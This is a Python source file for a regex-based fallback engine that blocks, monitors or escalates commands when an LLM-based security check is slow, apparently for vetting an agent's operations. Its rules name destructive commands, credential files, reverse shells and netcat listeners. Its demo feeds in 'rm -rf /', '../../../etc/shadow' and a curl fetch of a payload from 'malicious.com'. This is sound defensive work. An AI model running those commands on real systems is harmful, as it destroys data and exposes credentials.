#!/usr/bin/env python3
"""
Security Emergency Fallback System
Provides rule-based security decisions when LLM is slow or unavailable
"""

import json
import logging
import sqlite3
import threading
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, asdict
from enum import Enum
import re

class EmergencyThreatLevel(Enum):
    """Emergency threat levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    SAFE = "safe"

class FallbackAction(Enum):
    """Actions the fallback system can take"""
    IMMEDIATE_BLOCK = "immediate_block"
    ALLOW_WITH_MONITORING = "allow_with_monitoring"
    DEFER_TO_HUMAN = "defer_to_human"
    SAFE_MODE_ONLY = "safe_mode_only"
    EMERGENCY_LOCKDOWN = "emergency_lockdown"
    REQUEST_AUTHENTICATION = "request_authentication"

class SystemState(Enum):
    """Current system state"""
    NORMAL = "normal"
    DEGRADED = "degraded"
    EMERGENCY = "emergency"
    LOCKDOWN = "lockdown"
    MAINTENANCE = "maintenance"

@dataclass
class EmergencyRule:
    """Emergency security rule"""
    rule_id: str
    name: str
    pattern: str
    threat_level: EmergencyThreatLevel
    action: FallbackAction
    description: str
    enabled: bool = True
    priority: int = 1
    created_at: datetime = None
    last_triggered: datetime = None
    trigger_count: int = 0

    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()

@dataclass
class EmergencyDecision:
    """Emergency fallback decision"""
    decision_id: str
    operation: str
    parameters: Dict[str, Any]
    threat_level: EmergencyThreatLevel
    action: FallbackAction
    reasoning: str
    triggered_rules: List[str]
    processing_time_ms: float
    timestamp: datetime
    session_id: str
    requires_escalation: bool = False
    safe_alternatives: List[str] = None
    monitoring_requirements: List[str] = None

    def __post_init__(self):
        if self.safe_alternatives is None:
            self.safe_alternatives = []
        if self.monitoring_requirements is None:
            self.monitoring_requirements = []

class SecurityFallbackRuleEngine:
    """Rule engine for emergency security decisions"""

    def __init__(self, db_path: str = "emergency_rules.db"):
        self.db_path = db_path
        self.rules: Dict[str, EmergencyRule] = {}
        self.system_state = SystemState.NORMAL
        self.logger = logging.getLogger("security_fallback")
        self.lock = threading.RLock()

        self._init_database()
        self._load_default_rules()
        self._load_rules_from_db()

    def _init_database(self):
        """Initialize emergency rules database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS emergency_rules (
                rule_id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                pattern TEXT NOT NULL,
                threat_level TEXT NOT NULL,
                action TEXT NOT NULL,
                description TEXT,
                enabled BOOLEAN DEFAULT 1,
                priority INTEGER DEFAULT 1,
                created_at TEXT,
                last_triggered TEXT,
                trigger_count INTEGER DEFAULT 0
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS emergency_decisions (
                decision_id TEXT PRIMARY KEY,
                operation TEXT NOT NULL,
                parameters TEXT,
                threat_level TEXT NOT NULL,
                action TEXT NOT NULL,
                reasoning TEXT,
                triggered_rules TEXT,
                processing_time_ms REAL,
                timestamp TEXT,
                session_id TEXT,
                requires_escalation BOOLEAN DEFAULT 0
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS system_state_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                previous_state TEXT,
                new_state TEXT,
                reason TEXT,
                timestamp TEXT,
                initiated_by TEXT
            )
        """)

        conn.commit()
        conn.close()

    def _load_default_rules(self):
        """Load default emergency security rules"""
        default_rules = [
            # Critical security threats
            EmergencyRule(
                rule_id="crit_001",
                name="Path Traversal Attack",
                pattern=r".*\.\./.*|.*\.\.\\.*",
                threat_level=EmergencyThreatLevel.CRITICAL,
                action=FallbackAction.IMMEDIATE_BLOCK,
                description="Detects path traversal attempts",
                priority=1
            ),
            EmergencyRule(
                rule_id="crit_002",
                name="System Destruction Commands",
                pattern=r".*(rm\s+-rf\s*/|format\s+c:|del\s+/s\s+/q\s+\*).*",
                threat_level=EmergencyThreatLevel.CRITICAL,
                action=FallbackAction.IMMEDIATE_BLOCK,
                description="Detects system destruction commands",
                priority=1
            ),
            EmergencyRule(
                rule_id="crit_003",
                name="Credential Harvesting",
                pattern=r".*(password|passwd|shadow|credential|keylog|steal).*",
                threat_level=EmergencyThreatLevel.CRITICAL,
                action=FallbackAction.IMMEDIATE_BLOCK,
                description="Detects credential harvesting attempts",
                priority=1
            ),
            EmergencyRule(
                rule_id="crit_004",
                name="Network Exploitation",
                pattern=r".*(exploit|payload|reverse_shell|backdoor|netcat\s+-l).*",
                threat_level=EmergencyThreatLevel.CRITICAL,
                action=FallbackAction.IMMEDIATE_BLOCK,
                description="Detects network exploitation attempts",
                priority=1
            ),

            # High security threats
            EmergencyRule(
                rule_id="high_001",
                name="Privilege Escalation",
                pattern=r".*(sudo|su\s+root|chmod\s+777|setuid).*",
                threat_level=EmergencyThreatLevel.HIGH,
                action=FallbackAction.REQUEST_AUTHENTICATION,
                description="Detects privilege escalation attempts",
                priority=2
            ),
            EmergencyRule(
                rule_id="high_002",
                name="System Configuration Changes",
                pattern=r".*(crontab|systemctl|service|registry|hosts\s+file).*",
                threat_level=EmergencyThreatLevel.HIGH,
                action=FallbackAction.DEFER_TO_HUMAN,
                description="Detects system configuration changes",
                priority=2
            ),
            EmergencyRule(
                rule_id="high_003",
                name="External Network Access",
                pattern=r".*(curl|wget|http[s]?://|ftp://|ssh\s+.*@).*",
                threat_level=EmergencyThreatLevel.HIGH,
                action=FallbackAction.ALLOW_WITH_MONITORING,
                description="Detects external network access",
                priority=2
            ),

            # Medium security threats
            EmergencyRule(
                rule_id="med_001",
                name="File System Modifications",
                pattern=r".*(mkdir|rmdir|mv|cp\s+.*\s+/|write|create).*",
                threat_level=EmergencyThreatLevel.MEDIUM,
                action=FallbackAction.ALLOW_WITH_MONITORING,
                description="Detects file system modifications",
                priority=3
            ),
            EmergencyRule(
                rule_id="med_002",
                name="Process Management",
                pattern=r".*(kill|killall|pkill|ps\s+aux|top|htop).*",
                threat_level=EmergencyThreatLevel.MEDIUM,
                action=FallbackAction.ALLOW_WITH_MONITORING,
                description="Detects process management operations",
                priority=3
            ),

            # Safe operations
            EmergencyRule(
                rule_id="safe_001",
                name="Read Operations",
                pattern=r"^(read|cat|less|more|head|tail|view|show|list|ls|dir)\s+.*$",
                threat_level=EmergencyThreatLevel.SAFE,
                action=FallbackAction.ALLOW_WITH_MONITORING,
                description="Safe read operations",
                priority=5
            ),
            EmergencyRule(
                rule_id="safe_002",
                name="Help and Information",
                pattern=r"^(help|info|man|status|version|--help|-h)\s*.*$",
                threat_level=EmergencyThreatLevel.SAFE,
                action=FallbackAction.ALLOW_WITH_MONITORING,
                description="Help and information commands",
                priority=5
            ),
            EmergencyRule(
                rule_id="safe_003",
                name="Text Processing",
                pattern=r"^(echo|printf|grep|sed|awk|sort|uniq|wc)\s+.*$",
                threat_level=EmergencyThreatLevel.SAFE,
                action=FallbackAction.ALLOW_WITH_MONITORING,
                description="Safe text processing operations",
                priority=5
            )
        ]

        with self.lock:
            for rule in default_rules:
                self.rules[rule.rule_id] = rule

    def _load_rules_from_db(self):
        """Load custom rules from database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("""
            SELECT rule_id, name, pattern, threat_level, action, description,
                   enabled, priority, created_at, last_triggered, trigger_count
            FROM emergency_rules
        """)

        for row in cursor.fetchall():
            rule = EmergencyRule(
                rule_id=row[0],
                name=row[1],
                pattern=row[2],
                threat_level=EmergencyThreatLevel(row[3]),
                action=FallbackAction(row[4]),
                description=row[5],
                enabled=bool(row[6]),
                priority=row[7],
                created_at=datetime.fromisoformat(row[8]) if row[8] else datetime.now(),
                last_triggered=datetime.fromisoformat(row[9]) if row[9] else None,
                trigger_count=row[10]
            )

            with self.lock:
                self.rules[rule.rule_id] = rule

        conn.close()

    def evaluate_emergency_request(self, operation: str, parameters: Dict[str, Any],
                                 session_id: str) -> EmergencyDecision:
        """Evaluate request using emergency rules"""

        start_time = time.time()
        operation_text = f"{operation} {' '.join(str(v) for v in parameters.values())}"

        # Find matching rules
        matching_rules = []
        highest_threat = EmergencyThreatLevel.SAFE
        primary_action = FallbackAction.ALLOW_WITH_MONITORING

        with self.lock:
            # Sort rules by priority
            sorted_rules = sorted(self.rules.values(), key=lambda r: r.priority)

            for rule in sorted_rules:
                if not rule.enabled:
                    continue

                try:
                    if re.search(rule.pattern, operation_text, re.IGNORECASE):
                        matching_rules.append(rule.rule_id)

                        # Update threat level (take highest)
                        threat_priority = {
                            EmergencyThreatLevel.CRITICAL: 0,
                            EmergencyThreatLevel.HIGH: 1,
                            EmergencyThreatLevel.MEDIUM: 2,
                            EmergencyThreatLevel.LOW: 3,
                            EmergencyThreatLevel.SAFE: 4
                        }

                        if threat_priority[rule.threat_level] < threat_priority[highest_threat]:
                            highest_threat = rule.threat_level
                            primary_action = rule.action

                        # Update rule statistics
                        rule.last_triggered = datetime.now()
                        rule.trigger_count += 1

                except re.error as e:
                    self.logger.error(f"Invalid regex in rule {rule.rule_id}: {e}")

        # Apply system state modifiers
        if self.system_state == SystemState.EMERGENCY:
            if highest_threat != EmergencyThreatLevel.SAFE:
                highest_threat = EmergencyThreatLevel.CRITICAL
                primary_action = FallbackAction.IMMEDIATE_BLOCK
        elif self.system_state == SystemState.LOCKDOWN:
            primary_action = FallbackAction.IMMEDIATE_BLOCK

        # Generate decision
        decision = EmergencyDecision(
            decision_id=f"emer_{int(time.time() * 1000)}",
            operation=operation,
            parameters=parameters,
            threat_level=highest_threat,
            action=primary_action,
            reasoning=self._generate_reasoning(matching_rules, highest_threat),
            triggered_rules=matching_rules,
            processing_time_ms=(time.time() - start_time) * 1000,
            timestamp=datetime.now(),
            session_id=session_id,
            requires_escalation=self._requires_escalation(highest_threat, primary_action),
            safe_alternatives=self._generate_alternatives(operation, highest_threat),
            monitoring_requirements=self._generate_monitoring_requirements(primary_action)
        )

        # Log decision
        self._log_decision(decision)

        return decision

    def _generate_reasoning(self, triggered_rules: List[str], threat_level: EmergencyThreatLevel) -> str:
        """Generate human-readable reasoning for decision"""

        if not triggered_rules:
            return "No security rules triggered - default safe operation"

        rule_names = []
        with self.lock:
            for rule_id in triggered_rules:
                if rule_id in self.rules:
                    rule_names.append(self.rules[rule_id].name)

        reasoning = f"Triggered security rules: {', '.join(rule_names)}. "
        reasoning += f"Threat level: {threat_level.value}. "

        if threat_level == EmergencyThreatLevel.CRITICAL:
            reasoning += "Immediate security risk detected."
        elif threat_level == EmergencyThreatLevel.HIGH:
            reasoning += "High security risk requires careful review."
        elif threat_level == EmergencyThreatLevel.MEDIUM:
            reasoning += "Moderate security risk detected."
        else:
            reasoning += "Low risk operation."

        return reasoning

    def _requires_escalation(self, threat_level: EmergencyThreatLevel, action: FallbackAction) -> bool:
        """Determine if decision requires human escalation"""

        escalation_conditions = [
            threat_level == EmergencyThreatLevel.CRITICAL,
            action == FallbackAction.DEFER_TO_HUMAN,
            action == FallbackAction.EMERGENCY_LOCKDOWN,
            self.system_state in [SystemState.EMERGENCY, SystemState.LOCKDOWN]
        ]

        return any(escalation_conditions)

    def _generate_alternatives(self, operation: str, threat_level: EmergencyThreatLevel) -> List[str]:
        """Generate safe alternatives for risky operations"""

        alternatives = []

        if threat_level in [EmergencyThreatLevel.CRITICAL, EmergencyThreatLevel.HIGH]:
            alternatives.extend([
                "Use read-only operations instead",
                "Request proper authentication",
                "Contact system administrator",
                "Use approved tools and workflows"
            ])

        if "file" in operation.lower():
            alternatives.extend([
                "Use file viewing commands (cat, less, head)",
                "Check file permissions first",
                "Use temporary directory for tests"
            ])

        if "network" in operation.lower():
            alternatives.extend([
                "Use local resources when possible",
                "Verify URLs before accessing",
                "Use secure protocols (HTTPS, SFTP)"
            ])

        if "system" in operation.lower():
            alternatives.extend([
                "Use status and info commands",
                "Check documentation first",
                "Test in safe environment"
            ])

        return alternatives[:3]  # Limit to top 3 alternatives

    def _generate_monitoring_requirements(self, action: FallbackAction) -> List[str]:
        """Generate monitoring requirements based on action"""

        monitoring = []

        if action == FallbackAction.ALLOW_WITH_MONITORING:
            monitoring.extend([
                "Log all operations and outputs",
                "Monitor for unusual behavior",
                "Track resource usage"
            ])

        if action == FallbackAction.REQUEST_AUTHENTICATION:
            monitoring.extend([
                "Verify user identity",
                "Log authentication attempts",
                "Monitor privilege usage"
            ])

        if action == FallbackAction.DEFER_TO_HUMAN:
            monitoring.extend([
                "Alert human administrator",
                "Pause operation until approval",
                "Document decision rationale"
            ])

        return monitoring

    def _log_decision(self, decision: EmergencyDecision):
        """Log emergency decision to database"""

        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("""
            INSERT INTO emergency_decisions
            (decision_id, operation, parameters, threat_level, action, reasoning,
             triggered_rules, processing_time_ms, timestamp, session_id, requires_escalation)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            decision.decision_id,
            decision.operation,
            json.dumps(decision.parameters),
            decision.threat_level.value,
            decision.action.value,
            decision.reasoning,
            json.dumps(decision.triggered_rules),
            decision.processing_time_ms,
            decision.timestamp.isoformat(),
            decision.session_id,
            decision.requires_escalation
        ))

        conn.commit()
        conn.close()

        # Log to file
        log_level = {
            EmergencyThreatLevel.CRITICAL: logging.CRITICAL,
            EmergencyThreatLevel.HIGH: logging.ERROR,
            EmergencyThreatLevel.MEDIUM: logging.WARNING,
            EmergencyThreatLevel.LOW: logging.INFO,
            EmergencyThreatLevel.SAFE: logging.DEBUG
        }[decision.threat_level]

        self.logger.log(log_level,
                       f"Emergency decision: {decision.action.value} for {decision.operation} "
                       f"(threat: {decision.threat_level.value})")

    def add_custom_rule(self, rule: EmergencyRule) -> bool:
        """Add custom emergency rule"""

        try:
            # Validate regex pattern
            re.compile(rule.pattern)

            with self.lock:
                self.rules[rule.rule_id] = rule

            # Save to database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("""
                INSERT OR REPLACE INTO emergency_rules
                (rule_id, name, pattern, threat_level, action, description,
                 enabled, priority, created_at, last_triggered, trigger_count)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                rule.rule_id, rule.name, rule.pattern, rule.threat_level.value,
                rule.action.value, rule.description, rule.enabled, rule.priority,
                rule.created_at.isoformat(),
                rule.last_triggered.isoformat() if rule.last_triggered else None,
                rule.trigger_count
            ))

            conn.commit()
            conn.close()

            self.logger.info(f"Added custom rule: {rule.rule_id}")
            return True

        except re.error as e:
            self.logger.error(f"Invalid regex pattern in rule {rule.rule_id}: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Failed to add rule {rule.rule_id}: {e}")
            return False

    def update_system_state(self, new_state: SystemState, reason: str, initiated_by: str = "system"):
        """Update system state for emergency conditions"""

        previous_state = self.system_state
        self.system_state = new_state

        # Log state change
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("""
            INSERT INTO system_state_log
            (previous_state, new_state, reason, timestamp, initiated_by)
            VALUES (?, ?, ?, ?, ?)
        """, (
            previous_state.value, new_state.value, reason,
            datetime.now().isoformat(), initiated_by
        ))

        conn.commit()
        conn.close()

        self.logger.warning(f"System state changed: {previous_state.value} → {new_state.value} ({reason})")

    def get_rule_statistics(self) -> Dict[str, Any]:
        """Get statistics about rule usage"""

        with self.lock:
            stats = {
                "total_rules": len(self.rules),
                "enabled_rules": sum(1 for rule in self.rules.values() if rule.enabled),
                "most_triggered": None,
                "threat_distribution": {},
                "action_distribution": {}
            }

            # Find most triggered rule
            most_triggered = max(self.rules.values(), key=lambda r: r.trigger_count, default=None)
            if most_triggered:
                stats["most_triggered"] = {
                    "rule_id": most_triggered.rule_id,
                    "name": most_triggered.name,
                    "trigger_count": most_triggered.trigger_count
                }

            # Count by threat level
            for rule in self.rules.values():
                threat = rule.threat_level.value
                stats["threat_distribution"][threat] = stats["threat_distribution"].get(threat, 0) + 1

            # Count by action
            for rule in self.rules.values():
                action = rule.action.value
                stats["action_distribution"][action] = stats["action_distribution"].get(action, 0) + 1

        return stats

    def get_system_status(self) -> Dict[str, Any]:
        """Get current system status"""

        return {
            "system_state": self.system_state.value,
            "total_rules": len(self.rules),
            "enabled_rules": sum(1 for rule in self.rules.values() if rule.enabled),
            "last_update": datetime.now().isoformat(),
            "database_path": self.db_path
        }

def demo_emergency_fallback():
    """Demonstrate emergency fallback system"""

    engine = SecurityFallbackRuleEngine("demo_emergency.db")

    test_operations = [
        ("file_read", {"path": "config.json"}),
        ("rm -rf /", {"force": True}),
        ("sudo systemctl restart ssh", {"service": "ssh"}),
        ("cat /etc/passwd", {"file": "/etc/passwd"}),
        ("curl http://malicious.com/payload", {"url": "http://malicious.com/payload"}),
        ("help", {}),
        ("mkdir test_directory", {"name": "test_directory"}),
        ("../../../etc/shadow", {"path": "../../../etc/shadow"}),
        ("kill -9 1234", {"pid": 1234}),
        ("echo 'Hello World'", {"message": "Hello World"})
    ]

    print("🚨 Emergency Fallback System Demo")
    print("=" * 60)

    for i, (operation, parameters) in enumerate(test_operations):
        decision = engine.evaluate_emergency_request(operation, parameters, f"demo_session_{i}")

        print(f"\n{i+1}. Operation: {operation}")
        print(f"   Parameters: {parameters}")
        print(f"   Decision: {decision.action.value}")
        print(f"   Threat Level: {decision.threat_level.value}")
        print(f"   Reasoning: {decision.reasoning}")
        print(f"   Processing Time: {decision.processing_time_ms:.2f}ms")
        if decision.safe_alternatives:
            print(f"   Alternatives: {', '.join(decision.safe_alternatives[:2])}")
        if decision.requires_escalation:
            print(f"   ⚠️  ESCALATION REQUIRED")

    print(f"\n📊 Rule Statistics:")
    stats = engine.get_rule_statistics()
    for key, value in stats.items():
        if key != "most_triggered":
            print(f"   {key}: {value}")

    # Cleanup
    import os
    if os.path.exists("demo_emergency.db"):
        os.remove("demo_emergency.db")

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

    demo_emergency_fallback()